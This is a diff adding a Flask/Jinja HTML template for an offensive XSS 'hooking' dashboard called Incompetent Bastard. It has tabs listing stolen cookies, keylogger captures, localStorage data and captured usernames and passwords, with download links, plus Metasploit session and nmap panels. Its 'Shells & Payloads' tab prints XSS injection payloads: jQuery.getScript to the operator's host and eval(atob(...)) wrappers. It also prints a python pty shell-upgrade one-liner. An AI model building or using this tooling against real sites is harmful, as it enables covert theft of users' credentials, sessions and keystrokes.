@@ -1,0 +1,201 @@
+{% extends "bootstrap/base.html" %}
+{% block title %}Incompetent Bastard{% endblock %}
+
+{% block scripts %}
+
+{{super()}}
+<script src="{{url_for('static', filename='incompetentbastard.js')}}"></script>
+
+{% endblock %}
+
+
+{% block navbar %}
+<span class="button">Database</span>
+{% endblock %}
+
+{% block content %}
+<div class="container">
+<div class="well">
+  <h1>Incompetent Bastard</h1>
+  <p>{{quotes}}</p>
+</div>
+
+
+<div class="panel panel-default">
+  <div class="panel-body tabs">
+    <ul class="nav nav-pills" data-tabs="tabs">
+
+
+
+ 	<li {{'tab0' | zet_pill(cms_pag) | safe}}><a href="#tab0" data-toggle="tab">Dashboard</a>
+
+		{% if template: %}
+      <li {{'tab1' | zet_pill(cms_pag) | safe}}><a href="#tab1" data-toggle="tab">Findings</a>
+      </li> {% else %} Create findings!  {% endif %}
+      <li><a href="#tab2" data-toggle="tab">Notes</a>
+      </li>
+
+
+  {% if cookies: %}
+      <li><a href="#tab3" data-toggle="tab">Cookies</a>
+      </li>{% endif%}{% if  keylogger: %}
+      <li><a href="#tab4" data-toggle="tab">Keylogger</a>
+      </li>{% endif %}
+      {% if localstorage: %}
+      <li><a href="#tab5" data-toggle="tab">LocalStorage</a>
+      </li>{% endif%}{% if  keylogger: %}
+      <li><a href="#tab6" data-toggle="tab">Password</a>
+      </li>{% endif %}
+
+      <li><a href="#tab8" data-toggle="tab">Shells & Payloads</a>
+      <li><a href="#tab9" data-toggle="tab">Commands</a></li>
+
+  <li class="dropdown">
+    <a class="dropdown-toggle" data-toggle="dropdown" href="#">Bookmarks
+    <span class="caret"></span></a>
+    <ul class="dropdown-menu">
+      <li><a href="https://bitvijays.github.io/LFC-VulnerableMachines.html" target="_blank">bitvijays.github.io (Vulnerable Machines)</a></li>
+      <li><a href="https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html" target="_blank">bitvijays.github.io (Vulnerability Analysis)</a></li>
+
+      <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank">Payload All the Things</a></li>
+
+      <li><a href="https://book.hacktricks.xyz/welcome/readme" target="_blank">book.hacktricks.xyz</a></li>
+      <li><a href="https://attack.mitre.org/matrices/enterprise/" target="_blank">MITRE ATT&CK Enterprise Matrix</a></li>
+      <li><a href="https://owasp.org/Top10/" target="_blank">OWASP Top 10</a></li>
+      <li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/" target="_blank">OWASP WSTG - Latest</a></li>
+      <li><a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" target="_blank">CISA.gov known-exploited-vulnerabilities-catalog</a></li>
+      <li><a href="https://inthewild.io/feed" target="_blank">inTheWild Vulnerability Feed</a></li>
+
+
+
+      <li><a href="https://github.com/esidate/pentesting-active-directory/blob/main/v1/pentesting_active_directory_dark.png" target="_blank">Orange Cyberdefense V1 Active directory</a></li>
+         <li><a href="https://github.com/esidate/pentesting-active-directory/blob/main/v2/pentesting_active_directory.svg" target="_blank">Orange Cyberdefense V2 Active directory</a></li> 
+    </ul>
+  </li>
+
+
+    </ul>
+    <div class="tab-content">
+<div class="tab-pane fade {{'tab0' | zet_actief(cms_pag)}}" id="tab0">
+
+<h1>Dashboard</h1>
+<div id="poller">
+We have {{aantalhooked}} hits on xxs.js
+<h4>Available screens</h4>
+<pre>screens
+</pre>
+<h4>Available MSF sessions</h4>
+<pre>
+sessions
+</pre>
+
+<h4>Nmap -F</h4>
+<pre>
+sessions
+</pre>
+</div>		
+</div>
+{% if template: %}
+<div class="tab-pane fade {{'tab1' | zet_actief(cms_pag)}}" id="tab1">
+<h1>Findings</h1>
+{% for x in template: %}
+<h4 title="{{x.enbeschrijving}}">{{x.titel}}</h4>
+<ul>
+{{ x.id | bevindingen_halen(bevindingen) | safe}}
+
+
+<li><a href="#" class="modalweergeven" data-title="{{x.titel}}" data-rel="/dashboard/findings/add/{{x.id}}">Add {{x.titel}} finding</a></li>
+</ul>
+ {% endfor %}
+
+
+ </div>
+{% endif %}
+<div class="tab-pane fade" id="tab2">
+<h1>Notes</h1>
+</div>
+{% if cookies: %}
+<div class="tab-pane fade" id="tab3">
+<h1>Cookies</h1>
+{% for x in cookies: %}
+<h4>{{x.locatie}}</h4>
+<p><a href="/dashboard/xxs/download_cookies/{{x.id}}">[download]</a> <strong>{{x.ip}}</strong> <small>{{x.agent}}</small><pre>{{x.cookies}}</pre></p>
+{% endfor %}
+</div>
+{% endif %}
+
+{% if  keylogger: %}
+<div class="tab-pane fade" id="tab4">
+<h1>Keylogger</h1>
+
+{% for x in keylogger: %}
+<h4>{{x.locatie}}</h4>
+<p><a href="/dashboard/xxs/download_toetsen/{{x.id}}">[download]</a> {{x.ip}} <small>{{x.agent}}</small><pre>{{x.toetsen}}</pre></p>
+{% endfor %}
+</div>
+{% endif %}
+{% if  localstorage: %}
+<div class="tab-pane fade" id="tab5">
+<h1>Localstorage</h1>
+{% for x in localstorage: %}
+<h4>{{x.locatie}}</h4>
+<p><a href="/dashboard/xxs/download_localstorage/{{x.id}}">[download]</a> {{x.ip}}  <small>{{x.agent}}</small><pre>{{x.localstorage}}</pre></p>
+{% endfor %}
+</div>
+{% endif %}
+{% if  wachtwoorden %}
+<div class="tab-pane fade" id="tab6">
+<h1>Wachtwoorden</h1>
+{% for x in wachtwoorden: %}
+<h4>{{x.locatie}}</h4>
+<p><a href="/dashboard/xxs/download_creds/{x.id}}">[download]</a> {{x.ip}}  <small>{{x.agent}}</small><pre>{{x.username}}   {{x.password}}</pre></p>
+{% endfor %}
+</div>
+{% endif %}
+<div class="tab-pane fade" id="tab8">
+<h1>Shells & Payloads</h1>
+<h4>XXS Payloads</h4>
+<p>Jquery jQuery.getScript('{{appdata.localhost}}');</p>
+<pre>'+eval(atob('{{js1}}'))+'</pre>
+<p>Stand alone</p>
+<pre>'+btoa(eval(atob('{{js2}}')))+'</pre>
+<p>ewewwewe</p>
+<h4>Upgrading shell...</h4>
+<pre>python -c'import pty; pty.spawn("/bin/bash")'</pre>
+<h4>More stuff...</h4>
+<pre>
+{{shells}}
+</pre>
+</div>
+<div class="tab-pane fade" id="tab9">
+<h1>Commands</h1>
+<p>Some basic commands</p>
+
+</div>
+</div>
+</div>
+</div>
+<p>&copy; Jan-Karel Visser | <a href="https://incompetentbastard.com">Incompetent Bastard</a></p>
+
+<div class="modal fade grotemodalweergeven" tabindex="-1" role="dialog" aria-labelledby="Mijn grote model" aria-hidden="true">
+  <div class="modal-dialog modal-xl">
+    <div class="modal-content">
+
+      <div class="modal-header">
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+        <h2 class="modal-title h6" id="grotemodal">Overzicht</h2>
+
+      </div>
+      <div class="modal-body mijn-tekst">
+
+      </div>
+        <div class="modal-footer">
+         <button type="button" class="btn btn-danger" data-dismiss="modal">Sluiten</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+{% endblock %}
